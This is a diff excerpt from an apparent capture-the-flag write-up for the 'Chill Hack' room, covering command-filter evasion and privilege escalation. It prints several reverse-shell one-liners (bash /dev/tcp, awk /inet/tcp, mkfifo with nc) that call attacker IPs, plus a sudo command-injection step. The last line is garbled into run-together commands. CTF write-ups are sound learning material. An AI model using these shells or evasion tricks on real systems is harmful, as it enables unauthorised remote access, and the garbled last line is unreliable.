@@ -50,3 +50,13 @@ Realizing we cant access any more information using the webserver command prompt
 Using a basic bash reverse shell : `sh -i >& /dev/tcp/10.18.49.141/9001 0>&1` wil give nothing because once again the words are being filtered out, my guess is that there is a script running that filters out key words like bash, nc, ls, python etc and blocks them before ever reaching the actual command line, so to bypass this we can try to use whitespaces. Whitespaces, in short, are certain characters or strings of letters, that register as basically nothing, and basically correspond to nothing but can bypass certain firewalls that block certain words, I found that the command `awk 'BEGIN {s = "/inet/tcp/0/<machine_ip>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` worked for me but I'm sure there are other commands that can bypass this, now all I have to do is use nc to set up a listner so `rlwrap nc -lvp <port>`
 
 # Shell and Privesc
+
+![image](https://github.com/traveller404/CHill-Hack-CTF/assets/92340426/ee7d0dc4-0b09-4a22-af04-e35dba81052b)
+
+Once logged in, I'd like to make my shell more useable, this isnt required but can make the shell alot easier to use
+Checking aroud we see that in /home there are 3 users, 2 of which we are not allowed to change directory to, apart from a user called apaar 
+We see there is a file called local.txt and that looks important but we are denied permission to open it
+
+Using the command `sudo -l` we are allowed to use a hidden file in the apaar directory as the same use apaar, and we can sudo run it as apaar, and we also find it is vulnerable to command injection on the 2nd prompt
+
+After exploiting the vulnerable script, we are given a shell as apaarr\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.20.20 4242 >/tmp/fsudo -u apaar /home/apaar/.helpline.shpython3 -c 'import pty; pty.spawn("/bin/bash")'sudo -u apaar /home/apaar/.helpline.sh
